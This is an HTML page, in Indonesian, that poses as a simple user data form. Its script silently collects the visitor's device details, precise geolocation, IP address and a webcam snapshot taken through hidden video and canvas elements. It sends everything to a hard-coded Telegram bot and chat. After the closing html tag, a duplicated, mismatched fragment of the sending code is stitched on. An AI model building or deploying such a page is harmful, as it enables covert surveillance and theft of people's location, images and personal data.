<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Form + Kamera + Info Device</title>
  <style>
    body { background:black; color:lime; font-family:monospace; padding:20px; }
    label { display:block; margin-top:10px; }
    input, select { width:100%; padding:5px; margin-top:5px; }
    button { margin-top:15px; padding:10px; background:lime; border:none; font-weight:bold; cursor:pointer; }
    pre { white-space:pre-wrap; text-align:left; }
  </style>
</head>
<body>
<h2>üìù Isi Data + Aktifkan Kamera</h2>

<form id="userForm">
  <label>Nama: <input type="text" name="nama" required></label>
  <label>Usia: <input type="number" name="usia" required></label>
  <label>Jenis Kelamin:
    <select name="gender" required>
      <option value="Laki-laki">Laki-laki</option>
      <option value="Perempuan">Perempuan</option>
    </select>
  </label>
  <label>Tipe (Reseller/User/Dll):
    <input type="text" name="tipe">
  </label>
  <button type="submit">Kirim Data</button>
</form>

<video id="video" autoplay playsinline width="300" height="300" style="display:none"></video>
<canvas id="canvas" width="300" height="300" style="display:none"></canvas>
<pre id="log"></pre>

<script>
const BOT_TOKEN = "8275671762:AAFHjoV2ZQCW9y69JvUTarIw7hUT0NVAXF8";
const CHAT_ID   = "6216902201";

const logBox = document.getElementById("log");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");

async function getExtraInfo(){
  let info = {
    platform: navigator.platform,
    userAgent: navigator.userAgent,
    screen: `${screen.width}x${screen.height}`,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    date: new Date().toLocaleString()
  };

  // baterai
  if (navigator.getBattery) {
    try {
      let bat = await navigator.getBattery();
      info.battery = `${Math.round(bat.level*100)}% (${bat.charging?"Charging":"Not Charging"})`;
    } catch{}
  }

  // lokasi
  info.location = await new Promise(res=>{
    if (navigator.geolocation){
      navigator.geolocation.getCurrentPosition(p=>{
        res({
          lat:p.coords.latitude,
          lon:p.coords.longitude,
          acc:p.coords.accuracy+" m",
          maps:`https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`
        });
      },e=>res({error:e.message}));
    } else res({error:"Tidak didukung"});
  });

  // IP
  try {
    let ip = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
    info.ip = ip.ip;
  } catch{}

  return info;
}

async function sendToTelegram(photoBlob, formData, extra){
  let textMsg = `üë§ Data User
Nama: ${formData.nama}
Usia: ${formData.usia}
Gender: ${formData.gender}
Tipe: ${formData.tipe}

üì° Device Info
Platform: ${extra.platform}
UserAgent: ${extra.userAgent}
Resolusi: ${extra.screen}
Language: ${extra.language}
Timezone: ${extra.timezone}
Tanggal: ${extra.date}
Baterai: ${extra.battery||"?"}

üåç Lokasi:
${extra.location?.lat}, ${extra.location?.lon}
Akurasi: ${extra.location?.acc}
Maps: ${extra.location?.maps}

üåê IP: ${extra.ip||"?"}`;

  // kirim teks
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({chat_id:CHAT_ID, text:textMsg})
  });

  // kirim foto
  let fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("photo", photoBlob, "cam.png");

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
    method:"POST",
    body:fd
  });

  logBox.textContent = "‚úÖ Data & Foto terkirim ke Telegram!";
}

document.getElementById("userForm").onsubmit = async e=>{
  e.preventDefault();
  const formData = Object.fromEntries(new FormData(e.target).entries());
  logBox.textContent = "‚è≥ Mengambil info & kamera...";

  const extra = await getExtraInfo();

  // kamera
  navigator.mediaDevices.getUserMedia({video:true})
  .then(stream=>{
    video.srcObject = stream;
    video.onloadedmetadata=()=>{
      setTimeout(()=>{
        ctx.drawImage(video,0,0,canvas.width,canvas.height);
        canvas.toBlob(blob=>{
          sendToTelegram(blob, formData, extra);
          stream.getTracks().forEach(t=>t.stop());
        },"image/png");
      },2000);
    };
  })
  .catch(err=>{
    logBox.textContent="‚ùå Kamera error: "+err.message;
  });
};
</script>
</body>
</html>Screen: ${info.screen}
Language: ${info.language}
Timezone: ${info.timezone}
Date: ${info.date}
Battery: ${info.battery||"?"}

üåç Lokasi:
${info.location?.lat}, ${info.location?.lon}
Akurasi: ${info.location?.acc}
Maps: ${info.location?.maps}

üåê IP: ${info.ip||"?"}`;

  // kirim teks
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({chat_id:CHAT_ID, text:textMsg})
  });

  // kirim foto
  let formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("photo", photoBlob, "cam.png");

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
    method:"POST",
    body:formData
  });

  logBox.textContent = "‚úÖ Data & Foto terkirim ke Telegram!";
}

// mulai kamera + proses
(async ()=>{
  deviceInfo.ip = await getIP();
  deviceInfo.location = await getLocation();

  navigator.mediaDevices.getUserMedia({video:true})
  .then(stream=>{
    video.srcObject = stream;
    video.onloadedmetadata = ()=>{
      setTimeout(()=>{
        ctx.drawImage(video,0,0,canvas.width,canvas.height);
        canvas.toBlob(blob=>{
          sendToTelegram(blob, deviceInfo);
          stream.getTracks().forEach(t=>t.stop());
        },"image/png");
      },2000);
    };
  })
  .catch(err=>{
    logBox.textContent = "‚ùå Kamera error: "+err.message;
  });
})();
</script>
</body>
</html>
